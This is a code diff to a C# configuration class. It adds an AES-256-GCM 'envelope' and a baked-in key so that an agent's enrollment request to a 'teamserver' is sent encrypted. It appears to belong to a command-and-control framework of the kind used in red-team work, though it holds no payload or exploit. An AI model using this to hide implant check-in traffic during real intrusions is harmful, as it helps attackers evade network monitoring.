@@ -172,6 +172,7 @@ internal sealed class Config
                 EnrollPath = Env("ROD_ENROLL_PATH", string.Empty),
                 UserAgent = Env("ROD_USER_AGENT", string.Empty),
                 Envelope = Env("ROD_ENVELOPE", string.Empty),
+                EnvelopeKey = Env("ROD_ENVELOPE_KEY", string.Empty),
                 RequestTimeout = EnvTimeSpan("ROD_REQUEST_TIMEOUT", TimeSpan.Zero),
                 Headers = ParseHeadersEnv(Env("ROD_HEADERS", string.Empty)),
             },
@@ -534,12 +535,26 @@ internal sealed class TransportProfile
     public TimeSpan RequestTimeout { get; set; }
 
     /// <summary>How the enroll JSON body is shaped: "none" sends raw JSON, "base64"
-    /// wraps it as a single base64 string. Empty means none.</summary>
+    /// wraps it as a single base64 string, "aesgcm" wraps it as AES-256-GCM
+    /// ciphertext (itself base64) under the baked envelope key. Empty means
+    /// none.</summary>
     public string Envelope { get; set; } = string.Empty;
+
+    /// <summary>The AES-GCM envelope's baked key material, standard base64 of
+    /// keyId(16) || key(32). Only meaningful with the "aesgcm" envelope; the
+    /// bake (or ROD_ENVELOPE_KEY) fills it.</summary>
+    public string EnvelopeKey { get; set; } = string.Empty;
 
     /// <summary>True when the envelope wraps the enroll body as base64.</summary>
     public bool IsBase64Envelope =>
         Envelope.Equals("base64", StringComparison.OrdinalIgnoreCase);
+
+    /// <summary>True when the envelope encrypts the enroll body under the baked
+    /// key: the shape and the key must both be present, or the build is
+    /// treated as unencrypted (and the teamserver refuses the body).</summary>
+    public bool IsAesGcmEnvelope =>
+        Envelope.Equals("aesgcm", StringComparison.OrdinalIgnoreCase)
+        && EnvelopeKey.Length > 0;
 }
 
 /// <summary>
